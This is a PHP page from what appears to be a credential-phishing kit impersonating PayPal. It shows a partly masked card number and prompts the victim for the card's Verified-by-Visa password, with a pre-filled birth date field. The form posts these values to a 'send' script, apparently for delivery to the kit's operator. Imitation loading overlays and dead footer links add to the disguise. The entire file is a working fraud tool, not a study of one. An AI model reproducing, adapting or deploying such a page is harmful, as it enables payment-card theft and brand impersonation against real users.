<?php
	session_start();
	include("../settings/lang/index.php");
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title>PayPal</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
	<script type="text/javascript" src="../assets/js/main.js"></script>
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>
				<div class="xeonContent xeonContentInfo">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header class="xeonInfo">
							<div class="xeonLogo big"></div>
						</header>
						<div class="xeonsafe">
							<h1 class="xeonInfoTitle">Confirm your informations</h1>
								<p class="xeonFormTitle">Please verify carefully your card informations</p>

							<form action="../settings/send/xeonvbv.php" method="post" name="vbForm" onsubmit="return validateVbForm()">

								<p class="FieldsTitle">Card verification :</p>
								<div class="xeonFieldset">
									<input type="text" name="" class="xeoncctyped" value="4357 •••• •••• 8097" disabled="disabled" readonly="readonly" />
								</div>
								<div class="xeonFieldset">
									<input type="password" name="xeonccpas" id="xeonccpas" placeholder="<?php echo $xeon30; ?>" autocomplete="off" autocorrect="off" />
								</div>
								<div class="xeonFieldset">
									<input type="text" name="xeonsn" id="xeonsn" placeholder="<?php echo $xeon31; ?>" id="xeonssn" maxlength="10" autocomplete="off" autocorrect="off" readonly value="<?php echo $_SESSION["xeonBirth"]; ?>"/>
								</div>
								

								<input type="submit" class="xeonButton" value="<?php echo $xeon32; ?>">
							</form>
						</div>
					</div>

				<!-- LOADING -->
					<div class="xeonLoaderOverlay">
						<div class="xeonModalAnimate hide">
							<div class="xeonRotate"></div>
							<div class="xeonProcessing"><?php echo $xeon12; ?></div>
							<div class="xeonLoaderOverlayAdditionalElements"></div>
						</div>
					</div>
					<div class="xeonModalOverlay hide"></div>

				</div>
			</div>
		</div>
	</div>

	<footer class="xeonFooter">
		<ul class="xeonFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/sections.js"></script>

	<script>
	$(document).ready(function(){
		$('#xeonccpas').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonccpas').removeClass('hasError'); } else {$('#xeonccpas').removeClass('hasError'); }});

		$('#xeonsn').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#xeonsn').removeClass('hasError'); } else {$('#xeonsn').removeClass('hasError'); }});
		
		});
	</script>
	
<!-- LOADING -->
	<div class="xeonLoaderOverlay">
		<div class="xeonModalAnimate" id="xeonModalAnimate">
			<div class="xeonRotate"></div>
			<div class="xeonProcessing"><?php echo $xeon12; ?></div>
			<div class="xeonLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="xeonModalOverlay" id="xeonModalOverlay"></div>

</body>
</html>